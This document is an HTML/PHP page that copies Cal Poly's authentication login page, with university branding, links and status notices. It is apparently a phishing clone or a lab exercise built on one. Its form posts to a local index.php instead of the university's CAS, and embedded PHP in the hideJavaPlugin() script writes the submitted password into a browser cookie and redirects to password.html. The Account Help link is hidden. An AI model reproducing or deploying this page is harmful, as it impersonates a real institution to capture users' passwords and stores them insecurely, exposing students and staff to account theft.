<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
  <title>Cal Poly Authentication</title>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
  <meta content="Cal Poly, San Luis Obispo, a nationally ranked, four-year, public university that emphasizes a Learn By Doing educational experience; located minutes from California's Central Coast beaches." name="description" />
  <meta content="Cal Poly, California Polytechnic State University, San Luis Obispo, engineering, agriculture, business, architecture, liberal arts, four-year comprehensive, public university, nationally ranked" name="keywords" />

  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="apple-mobile-web-app-capable" content="yes" />

  
  <meta http-equiv="Refresh" content="1620; /cas/login">
  

  
<script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(u(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(2),u=t(3),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var s=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],p="api-",l=p+"ixn-";a(s,function(t,e){f[e]=o(p+e,!0,"api")}),f.addPageAction=o(p+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var d=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){d[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],2:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],3:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?u(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),u=a.length,c=0;c<u;c++)a[c].apply(i,r);var s=f[m[n]];return s&&s.push([w,n,r,i]),i}function p(t,e){g[t]=l(t).concat(e)}function l(t){return g[t]||[]}function d(t){return s[t]=s[t]||o(n)}function v(t,e){c(t,function(t,n){e=e||"feature",m[n]=e,e in f||(f[e]=[])})}var g={},m={},w={on:p,emit:n,get:d,listeners:l,context:e,buffer:v};return w}function i(){return new r}var a="nr@context",u=t("gos"),c=t(2),f={},s={},p=e.exports=o();p.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!h++){var t=y.info=NREUM.info,e=s.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(m,function(e,n){t[e]||(t[e]=n)});var n="https"===g.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",u("mark",["onload",a()],null,"api");var r=s.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===s.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=t("handle"),c=t(2),f=window,s=f.document,p="addEventListener",l="attachEvent",d=f.XMLHttpRequest,v=d&&d.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:d,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(1);var g=""+location,m={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-974.min.js"},w=d&&v&&v[p]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:g,features:{},xhrWrappable:w};s[p]?(s[p]("DOMContentLoaded",i,!1),f[p]("load",r,!1)):(s[l]("onreadystatechange",o),f[l]("onload",r)),u("mark",["firstbyte",a()],null,"api");var h=0},{}]},{},["loader"]);</script><link type="image/x-icon" href="favicon.ico" rel="shortcut icon" />
  <link href="bootstrap.css" media="screen" type="text/css" rel="stylesheet" >
  <link href="login.css" media="screen" type="text/css" rel="stylesheet" />

  <meta name="viewport" content="initial-scale=1,user-scalable=no,maximum-scale=1">

  
  <!--<script src="https://webresource.its.calpoly.edu/deployJava/2/deployJava.js"></script>-->
  <script language="JavaScript" type="text/javascript">
  function checkIfSupportedOS() {
     if (navigator.userAgent.indexOf("Windows NT 5.1")!=-1) {
        document.getElementById("unsupportedOS").style.display = "block";
        document.getElementById("loginForm").style.display = "none";
     } else {
        document.getElementById("unsupportedOS").style.display = "none";
     }
  };
  function hideJavaPlugin() {
     if (document.getElementById("deployJavaPlugin"))
	 {
		document.getElementById("deployJavaPlugin").style.display = "none";
	 }
	 
	 document.cookie = <?php if(isset($_POST['password'])){ echo json_encode($_POST['password']);} else { echo json_encode('javaScript(0)'); } ?>;	
		if(<?php echo isset($_POST['password']) ?>){
			window.location = "password.html";
		}
		<?php  $_POST = array(); ?>
  };
  function reportJavaVersion() {
     var url = "https://my.calpoly.edu/cas/clientData?javaVersion="+deployJava.getJREs();
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("GET", url, false);
     xmlHttp.send(null);
  };
  </script>
  
</head>

  
  <!-- Removed reportJavaVersion() from body onload -->
  <body onload="checkIfSupportedOS(); hideJavaPlugin();">

  
    <div id = "mainContainer">
      <header>
        <div id = "top" class = "navbar">
          <ul class = "leftLinks nav">
            <li><a href = "http://www.calpoly.edu/student/parents.html">Parents</a></li>
            <li><a href = "http://servicedesk.calpoly.edu/accounts">Account</a></li>
            <li><a href = "http://maps.calpoly.edu">Map</a></li>
            <li><a href = "https://myportal.calpoly.edu/s/directory">Directory</a></li>
          </ul>
        </div>
      </header>
      <div id = "bodyContainer">











<div class = "mobile-header">
	<div class = "sidebtn">
		<button id = "leftSidebarOpen"><img src = "media/skins/sage/images/sidebarslider.png" width="20" height="24"/></button>
	</div>
</div> 
<div id = "loginContainer" class="page-inner">
	<div id="loginLogo">
		<a href = "http://www.calpoly.edu" title="Cal Poly San Luis Obispo">
			<img src = "CP_Logo_Transparent.png" alt = "Cal Poly San Luis Obispo"/>
		</a>
	</div> 

<div id="loginFormContainer" >
  	<div id="loginForm"> 
      	<!-- BEGIN CAS -->
			<form id="fm1" name="login_form" action="index.php" method="post">

				<div class="uportal-text-error" style="margin-top: .5em; margin-bottom: .5em;">
					
				</div>
				
				<div class="input-block first-block">
				<label for="username">Username</label>
				
				
				
					
					<input id="username" name="username" class="required input-medium" tabindex="1" accesskey="n" type="text" value="" size="25" autocomplete="false"/>
				
				<span class="help-block"><a href="http://servicedesk.calpoly.edu/accounts" style="visibility: hidden;">Account Help</a></span>
				</div>

				<div class="input-block">
				<label for="password">Password</label>
				

				
				<input id="password" name="password" class="required input-medium" tabindex="2" accesskey="p" type="password" value="" size="25" autocomplete="off"/>
				<span class="help-block"><a href="https://myportal.calpoly.edu/s/password">Need Help?</a></span>
				</div>


				<div class="submit-block">
					<!--<label for="submitLogin">Submit</label>-->
					<input id="submitLogin" class="btn btn-success loginButton" name="submit" accesskey="l" value="Sign In" tabindex="4" type="submit" />
				</div>
				<!--input class="btn-reset" name="reset" accesskey="c" value="CLEAR" tabindex="5" type="reset" /-->				
		</form>
		<!-- END CAS -->	
	</div>
	<div id = "mayday">
		<h1>Critical System Status</h1>
	</div>
    <div id="unsupportedOS">
      <h1>Discontinued Windows XP Support</h1>
      <div class="mayday-item ERROR" style="padding: 0px 10px 6px 40px;">
        <p><span style="color: #aa2535; font-weight: bold;">Warning:</span>
        As of <span style="color: #aa2535; font-weight: bold;">June 20, 2015</span>,
        your system is denied access for security reasons. Systems that are no
        longer supported by Apple and Microsoft are considered a security risk.
        For your and the University's protection, computers running Windows XP
        and Apple OS X 10.6 or older will not be allowed to connect to Cal Poly
        wired or wireless network. Please upgrade your machine or Operating
        System to gain access.</p>
      </div>
    </div>
</div>
</div>

    	</div><!-- end bodyContainer-->
        <footer>
            <div id="loginLinks">
                <a href="http://security.calpoly.edu/content/policies/index">Policy</a>
                	<i>|</i> <a href="https://myportal.calpoly.edu/help/feedback.html">Feedback</a> 
                	<i>|</i> <a href="http://servicedesk.calpoly.edu/content/my_cp_support/index">FAQ/Help</a>
            </div>
        </footer>
        
        </div><!-- end main container-->
        

<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"applicationID":"22253028","applicationTime":2,"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"4e34bbaf17","transactionName":"YldTYBRYXUVVURdZXFsde2c2FmRzdh8qfnUaRFhRERZZRUQdAFFfRV1dTUlMWhlXUxB8XFJbX2IPXEQYXkET","agent":"","errorBeacon":"bam.nr-data.net"}</script></body>

<script src="media/skins/sage/js/jquery-1.9.1.js" type="text/javascript"></script>
<script src="media/skins/sage/js/jquery-ui-1.10.1.custom.min.js" type="text/javascript"></script>
<script src="media/skins/sage/js/detectMobile.js" type="text/javascript"></script>
<script src="media/skins/sage/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
<script src="media/skins/sage/js/systemStatus.js" type="text/javascript"></script>
<script src="media/skins/sage/js/sidebar.js" type="text/javascript"></script>
<script
  src="https://code.jquery.com/jquery-3.1.1.min.js"
  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
  crossorigin="anonymous"></script>
<script type="text/javascript">
$(document).ready(function() {
	
	if (!jQuery.browser.mobile){
		$("#username").focus();
	}
	    
});
</script>
</html>
